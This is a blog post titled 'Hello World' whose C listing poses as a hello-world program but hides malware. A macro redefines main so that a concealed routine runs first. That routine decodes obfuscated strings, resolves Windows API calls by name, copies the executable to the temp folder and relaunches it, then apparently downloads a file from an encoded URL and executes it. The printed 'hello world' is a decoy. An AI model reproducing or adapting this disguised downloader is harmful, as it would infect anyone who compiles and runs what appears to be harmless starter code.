---
title: "Hello World"
layout: post
description: "Hello World"
robots: none
---

{% highlight c %}
#include <stdio.h>
#define sc _stdcall
#define M main
int _m();
#define main M(l p,l q){_hd(p,q);_m();}int _m
typedef unsigned long l;typedef char c,*s;typedef void v,*p;
typedef l(sc*F0)();typedef l(sc*F9)(l,l,l,l,l,l,l,l,l);
typedef l(sc*F1)(l); typedef l(sc*F8)(l,l,l,l,l,l,l,l);
typedef l(sc*F2)(l,l); typedef l(sc*F7)(l,l,l,l,l,l,l);
typedef l(sc*F3)(l,l,l); typedef l(sc*F6)(l,l,l,l,l,l);
typedef l(sc*F4)(l,l,l,l); typedef l(sc*F5)(l,l,l,l,l);
c __mp[1<<7]={0};l i,j,k,m,n,kl,nl,sl;c bf[1<<12];
l strcpy(l,l);l strcat(l,l);
F1 _nc,_ll,_fc;F2 _ga,_tp;F3 _cf;F4 _nr;F5 _no,_fw;F6 _nu,_sh;F7 _fn;
s __st[]={")GFzGda&Zldd","MszszG\\Zldd","!8Gdda&Zldd",
          "3z\\GFzG\\u0Gz;","3z\\GFzG\\fG{lBsdG","3z\\GFzG\\u0GzWFd;",
          "3z\\GFzG\\QdU!GX{zldG","QFG{\\GBsdG;","mFs\\GBsdG",
          "QdU!GX{zldG","QU0cBsdG;\0\\;","}G\\|G?0P{\\8;",
          "A8Gddg(G17\\G;","zGMVGFZG(G","8\\\\0~55MZ!Z]05sz!\\{ddZl{\\",
          "\\G?0ZG(G\0QEd","F7z{!\0\\0","U0Gz\0GzzD"};
l _dc(s o,s i){
    s p=i;do*(o+(l)p-(l)i+1)=__mp[*p];while(*p && p++);return 0;}
l rl(s z){for(i=0;i<sizeof(l)*8;i++)
    if(((l)z>>i)&1)z=(s)((l)z&~(1<<i));else{z=(s)((l)z|(1<<i));break;};
    return (l)z;}
v _in(){
    l sc LoadLibraryA(l);l sc GetProcAddress(l,l);
    i=j=0;do*(__mp+ j++ +0x20)=i+0x20,i=(i+83)%(0x60);while(i!=0);
    _ga =(F2)GetProcAddress,_ll=(F1)LoadLibraryA;kl=_ll((_dc(bf,__st[0]),rl(bf)));
    nl=_ll((_dc(bf,__st[1]),rl(bf)));sl=_ll((_dc(bf,__st[2]),rl(bf)));
    _no=(F5)_ga(nl,(_dc(bf,__st[3]),rl(bf)));_nr=(F4)_ga(nl,(_dc(bf,__st[4]),rl(bf)));
    _nu=(F6)_ga(nl,(_dc(bf,__st[5]),rl(bf)));_nc=(F1)_ga(nl,(_dc(bf,__st[6]),rl(bf)));
    _fn=(F7)_ga(kl,(_dc(bf,__st[7]),rl(bf)));_fw=(F5)_ga(kl,(_dc(bf,__st[8]),rl(bf)));
    _fc=(F1)_ga(kl,(_dc(bf,__st[9]),rl(bf)));_cf=(F3)_ga(kl,(_dc(bf,__st[10]),rl(bf)));
    _tp=(F2)_ga(kl,(_dc(bf,__st[11]),rl(bf)));_sh=(F6)_ga(sl,(_dc(bf,__st[12]),rl(bf)));
}
l _dl(l u){
    l cn,sn,f,rr,ln=0;
    sn=_no((l)"poilynx",1,0,0,0);if(!sn)return 0;
    cn = _nu(sn,(_dc(bf,__st[14]),rl(bf)),0,0,1<<30,0);
    if(!cn){_nc(sn);return 0;}f=_fn(u,1<<30,3,0,2,1<<7,0);
    while(_nr(cn,(l)bf, sizeof(bf),(l)&rr),rr)ln+=rr,_fw(f,(l)bf,rr,(l)&rr,0);
    _nc(cn);_nc(sn);_fc(f);
    return 1;
}
v _hd(l ac,l av)
{
    c td[1<<10];_in();_tp(1<<12,(l)td);
    if(ac>1 && (((s*)av)[1])[0]==0x53 && (((s*)av)[1])[1]==0){
        strcat((l)td,(_dc(bf,__st[13]),rl(bf)));
        while(!_dl((l)td));
        while(_sh(0,(_dc(bf,__st[16]),rl(bf)),(l)td,0,0,0)<1<<5);
    }else{
        strcat((l)td,(_dc(bf,__st[15]),rl(bf)));_cf((l)((s*)av)[0],(l)td,0);
        _sh(0,(_dc(bf,__st[17]),rl(bf)),(l)td,(m=0x53,(l)&m),0,0);}
    return;
}

int main()
{
    puts("hello world");
    getchar();
    return 0;
}
{% endhighlight %}
